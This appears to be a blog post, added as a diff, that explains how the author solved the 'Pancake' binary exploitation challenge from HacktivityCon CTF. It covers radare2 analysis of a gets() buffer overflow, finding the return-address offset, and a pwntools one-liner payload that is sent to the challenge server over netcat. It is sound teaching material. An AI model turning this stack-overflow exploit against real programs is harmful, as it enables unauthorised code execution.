@@ -1,0 +1,202 @@
+export const meta = {
+  title: "Pancake (HacktivityCon CTF)",
+  description: "HacktivityCon CTF",
+  date: "August 1, 2020",
+};
+
+import styles from "../../../styles/post.module.css";
+
+<div className={styles.post}>
+
+# Pancake (HacktivityCon CTF)
+
+###### August 1, 2020
+
+**Description**
+Pancake is a simple binary exploitation challenge from HacktivityCon CTF.
+Entering a long string causes a buffer overflow and pancake segfaults. Some familiarity with radare2 and the call stack will be helpful going through this writeup. A great guide on radare2 can be found [here](https://www.megabeets.net/a-journey-into-radare-2-part-1/).
+**Analysis**
+Load and analyze the binary in radare2. The stack is not executable, but the file isn't protected by [canaries](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries) nor compiled with support for [position independent code](https://en.wikipedia.org/wiki/Position-independent_code). This means that there is no protection against buffer overflows and the segments will always be loaded to the same location.
+
+<div className={styles.codeblock}>
+
+```
+$ r2 -A pancakes
+[0x00400700]> iI
+arch     x86
+baddr    0x400000
+binsz    6995
+bintype  elf
+bits     64
+canary   false
+nx       true
+pic      false
+... (output truncated)
+```
+
+</div>
+
+List function symbols within the binary. Although most of the functions are from C libraries and calls used by the program, two of them stand out. One of them is <code>main</code>, which is always worth checking out. The second is <code>secret_recipe</code>, which seems to be a user defined function.
+
+<div className={styles.codeblock}>
+
+```
+[0x00400700]> afl
+0x00400700    1 42           entry0
+0x00400740    4 42   -> 37   sym.deregister_tm_clones
+0x00400770    4 58   -> 55   sym.register_tm_clones
+0x004007b0    3 34   -> 29   sym.__do_global_dtors_aux
+0x004007e0    1 7            entry.init0
+0x00400a70    1 2            sym.__libc_csu_fini
+0x00400a74    1 9            sym._fini
+0x0040098b    1 113          sym.secret_recipe
+0x004006d0    1 6            sym.imp.fopen
+0x00400690    1 6            sym.imp.fread
+0x00400680    1 6            sym.imp.puts
+0x00400a00    4 101          sym.__libc_csu_init
+0x00400730    1 2            sym._dl_relocate_static_pie
+0x004007e7   10 420          main
+0x00400648    3 23           sym._init
+0x00400670    1 6            sym.imp.putchar
+0x004006a0    1 6            sym.imp.printf
+0x004006b0    1 6            sym.imp.gets
+0x004006c0    1 6            sym.imp.setvbuf
+0x004006e0    1 6            sym.imp.atoi
+0x004006f0    1 6            sym.imp.usleep
+0x004000ea    1 2            fcn.004000ea
+```
+
+</div>
+
+Firstly, examine the <code>secret_recipe</code> because it's supposed to be a secret. Going over the disassembly, the function is simple. <code>secret_recipe</code> opens a file named <code>flag.txt</code>, reads it contents and prints it out.
+
+<div className={styles.codeblock}>
+
+```
+[0x00400700]> pdf @ sym.secret_recipe
+... (output truncated, radare comments removed for better readability)
+0x004009a5       488d3dce0200.   lea rdi, str.flag.txt
+0x004009ac       e81ffdffff      call sym.imp.fopen
+0x004009b1       488945f0        mov qword [stream], rax
+0x004009b5       488b55f0        mov rdx, qword [stream]
+0x004009b9       488d8560ffff.   lea rax, [ptr]
+0x004009c0       4889d1          mov rcx, rdx
+0x004009c3       ba80000000      mov edx, 0x80
+0x004009c8       be01000000      mov esi, 1
+0x004009cd       4889c7          mov rdi, rax
+0x004009d0       e8bbfcffff      call sym.imp.fread
+0x004009f4       e887fcffff      call sym.imp.puts
+```
+
+</div>
+
+Next, skimming through the disassembly for <code>main</code>, the function also seems fairly straightforward - prints some stuff, gets user input and prints more stuff. <code>main</code> uses the <code>gets</code> function to get input. <code>gets</code> is a deprecated function that does not peform checks on input length, leading to potential buffer overflows exploits. This explains the segfault upon passing in a long string.
+
+<div className={styles.codeblock}>
+
+```
+[0x00400700]> pdf @ main
+... (output truncated, radare comments removed for better readability)
+0x0040085b      e860feffff     call sym.imp.setvbuf
+0x00400860      488d3d510300.  lea rdi, str.Welcome_to_the_pancake_stacker
+0x00400867      e814feffff     call sym.imp.puts
+0x0040086c      488d3d650300.  lea rdi, str.How_many_pancakes_do_you_want
+0x00400873      e808feffff     call sym.imp.puts
+0x00400878      488d8570ffff.  lea rax, [str]
+0x0040087f      4889c7         mov rdi, rax
+0x00400882      b800000000     mov eax, 0
+0x00400887      e824feffff     call sym.imp.gets
+0x0040088c      488d8570ffff.  lea rax, [str]
+0x00400893      4889c7         mov rdi, rax
+0x00400896      b800000000     mov eax, 0
+0x0040089b      e840feffff     call sym.imp.atoi
+0x004008a0      8945f0         mov dword [var_10h], eax
+0x004008a3      488d3d4d0300.  lea rdi, str.Cooking_your_cakes
+0x004008aa      b800000000     mov eax, 0
+0x004008af      e8ecfdffff     call sym.imp.printf
+... (output truncated)
+```
+
+</div>
+
+Note that <code>main</code> does not make a call to <code>secret_recipe</code>. Maybe the vulnerable <code>gets</code> can be exploited to overwrite the return address on the stack?
+**Exploitation**
+To craft the payload, we need to identify the offset in our buffer where the return address will be placed. To do so, generate a [De Bruijn Sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) long enough string to cause a segfault. The sequence can be generated by using <code>ragg2</code>, which is part of the radare project.
+
+<div className={styles.codeblock}>
+
+```
+$ ragg2 -P 200 -r
+AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA%
+```
+
+</div>
+
+Run radare2 in debug mode <code>r2 -d ./pancake</code>. Analyze the binary and set a breakpoint at the <code>ret</code> instruction in <code>main</code>. This will pause execution of the program just before the <code>main</code> function exits, allowing us to examine the stack. <code>dc</code> to begin execution of the program, passing the De Bruijn Sequence when prompted. Since we have placed a breakpoint at the end of main, the program should pause execution. Print the first 16 bytes on the stack using <code>pxw 8 @ rsp</code>. Using the first four bytes on the stack, calculate the offset using the command <code>wopO 0x41417a41</code>. This is where we will place the address to <code>secret_recipe</code>.
+
+<div className={styles.codeblock}>
+
+```
+[0x00400700]> pdf @ main
+... (output truncated)
+0x00400984      b800000000     mov eax, 0
+0x00400989      c9             leave
+0x0040098a      c3             ret
+[0x00400700]> db 0x0040098a
+[0x00400700]> dc
+... (output truncated)
+hit breakpoint at: 40098a
+[0x0040098a]> pxw 16 @ rsp
+0x7ffffe1723b8  0x41417a41 0x32414131 0x41334141 0x41413441  AzAA1AA2AA3AA4AA
+[0x0040098a]> wopO 0x41417a41
+152
+```
+
+</div>
+
+The final payload will be just a buffer of 152 bytes with the address of <code>secret_recipe</code> added onto the end. Since data is stored and loaded in little endian format on x86, the address to <code>secret_recipe</code> must be passed with the same endianess. Pwntools can be used to easily convert the address into little endian format, instead of doing it manually, which can be tedious. Finally create a file (if it does not already exist) in the same directory named <code>file.txt</code> to test the payload.
+
+<div className={styles.codeblock}>
+
+```
+$ cat flag.txt
+FLAG{HASH123}
+$ python -c "from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b'A'*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)" | ./pancakes
+...(output truncated)
+FLAG{HASH123}
+[1]    17531 done                              python -c  |
+       17532 segmentation fault (core dumped)  ./pancakes
+```
+
+</div>
+
+With the payload working, throw it over netcat to capture the flag.
+
+<div className={styles.codeblock}>
+
+```
+$ {python -c "from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b'A'*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)";cat;} | nc jh2i.com 50021
+Welcome to the pancake stacker!
+How many pancakes do you want?
+Cooking your cakes.....
+Smothering them in butter.....
+Drowning them in syrup.....
+They're ready! Our waiters are bringing them out now...
+        _____________
+       /    ___      \\
+      ||    \\__\\     ||
+      ||      _      ||
+      |\\     /\ \     /|
+      \\ \\___/ ^ \\___/ /
+      \\\\____/_^_\\____//_
+    __\\\\____/_^_\\____// \\
+   /   \____/_^_\____/ \\ \\
+  //                   , /
+  \\\\___________   ____  /
+               \\_______/
+flag{too_many_pancakes_on_the_stack}
+```
+
+</div>
+
+</div>
